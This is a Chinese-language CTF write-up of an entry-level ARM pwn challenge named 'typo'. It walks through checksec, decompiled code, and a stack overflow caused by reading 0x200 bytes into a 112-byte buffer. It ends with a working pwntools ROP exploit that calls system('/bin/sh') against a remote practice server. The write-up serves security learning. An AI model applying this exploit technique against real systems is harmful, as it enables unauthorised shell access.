---
title: typo
date: 2023-03-23 15:56:03
categories: 
- pwn_wp
tags: 
- pwn
- arm
- stackoverflow

---

arm pwn入门题，有`system`和`/bin/sh`，简单的栈溢出。
<!-- more -->

先checksec和file查下：

```sh
# 32位ARM，静态链接
typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped

# 只开了NX
[*] '/home/a1ph0nse/PwnPractice/OwnStudy/ARMpwn/typo'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8000)
```

逆向：

有太多的sub了，很多函数需要靠猜。

程序大概的功能就是不断随机读取单词表中的一个单词，如果输入与他一样则继续，否则告诉你`E.r.r.o.r`，输入`~`则结束，会告诉你准确率以及速度。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *v3; // r3
  int v4; // r1
  void *v5; // r2
  void *v6; // r3
  int v7; // r0
  int v8; // r0
  int correct; // r0
  int v10; // r1
  double v11; // r0
  int v12; // r3
  double v14; // [sp+8h] [bp-2Ch]
  int v15; // [sp+10h] [bp-24h]
  int v16; // [sp+14h] [bp-20h]
  int idx; // [sp+18h] [bp-1Ch]
  int v18; // [sp+1Ch] [bp-18h]
  int v19; // [sp+20h] [bp-14h]
  int v20; // [sp+24h] [bp-10h]

  v20 = 0;
  v19 = 0;
  setbuf((unsigned int *)off_A1538, 0, 2);
  setbuf((unsigned int *)off_A1534[0], 0, 2);
  write(
    (void *)1,
    "Let's Do Some Typing Exercise~\nPress Enter to get start;\nInput ~ if you want to quit\n",
    (void *)0x56,
    v3);
  if ( getchar() != '\n' )
    exit(-1);
  write((void *)1, "------Begin------", (void *)0x11, (void *)'\n');
  v7 = gettimeofday(0, v4, v5, v6);
  sub_FE28(v7);
  correct = ftime(v8);
  v18 = correct;
  do
  {
    ++v20;
    idx = rand(correct, v10) % 4504;
    printf("\n%s\n", &aAbandon[20 * idx]);      // 从单词表中输出一个单词
    correct = read_and_cmp((int)&aAbandon[20 * idx]);// 接收输入并与单词比较 漏洞在这
    v16 = correct;
    if ( !correct )                             // 输入的与输出的不一致则输出error
    {
      correct = puts((int)"E.r.r.o.r.");
      ++v19;
    }
  }
  while ( v16 != 2 );
  v15 = ftime(correct);
  LODWORD(v11) = sub_9428(v15 - v18);
  v14 = v11 / 1000000.0;
  write((void *)1, "------END------", (void *)0xF, (void *)COERCE_UNSIGNED_INT64(v11 / 1000000.0));
  sub_11F80('\n');
  sub_8DF0(v20 - 1, v19, v14);
  puts((int)"Bye");
  return v12;
}
```

重点关注接收输入并比较的函数`read_and_cmp`：

```c
int __fastcall sub_8D24(unsigned __int8 *a1)
{
  unsigned int len; // r0
  int v2; // r4
  char v6[112]; // [sp+Ch] [bp-70h] BYREF

  memset(v6, 0, 100);
  read(0, v6, (void *)0x200, v6);               // 类似read，读取0x200byte到v6，存在栈溢出
  len = strlen(a1);
  if ( !strcmp(a1, (unsigned __int8 *)v6, len) )
  {
    v2 = strlen(a1);
    if ( v2 == strlen(v6) - 1 )
      return 1;
  }
  if ( v6[0] == '~' )
    return 2;                                   // 到这里才能跳出循环
  return 0;
}
```

到这里漏洞已经挺明显的了，存在栈溢出漏洞，而且程序中存在`system`和`/bin/sh`，覆盖返回地址执行`system("/bin/sh")`就可以get shell了。

但是`ARM`架构和`x86`架构有些不同，`ARM`栈结构不像`x86`那样有`bp`和`return_addr`垫在最下方，但也差不多。

`ARM`使用`LR`寄存器（`R14`或`X30`）保存函数的返回地址，而为了能在该函数执行完后，知道上一层函数的返回地址，需要将其保存在栈上，在函数返回时更新`LR`寄存器的值，因此可以通过栈溢出覆盖这个值来控制`LR`。

在进行`ROP`的时候`ARM`也有所不同，由于`POP`和`PUSH`可以对`LR`和`PC`进行操作，没有`ret`，因此控制`PC`控制程序的执行流。通常找的`gadget`后面都有对`pc`的控制，通过控制`PC`控制执行流即可。

exp:

```py
from pwn import*
context(log_level='debug',os='linux',arch='arm')
filename='typo'
elf=ELF('./'+filename)
#libc=ELF('')
# p=process('./'+filename)
# p=process(["qemu-arm", "-g", "8888", "./typo"])
#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})
p=remote('node4.buuoj.cn',28805)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()
    
pop_ro_r4_pc=0x00020904
sys_addr=0x000110B4
binsh_addr=0x0006C384
r()
s(b'\n')
payload=b'a'*112+p32(pop_ro_r4_pc)+p32(binsh_addr)*2+p32(sys_addr)
s(payload)

itr()
```



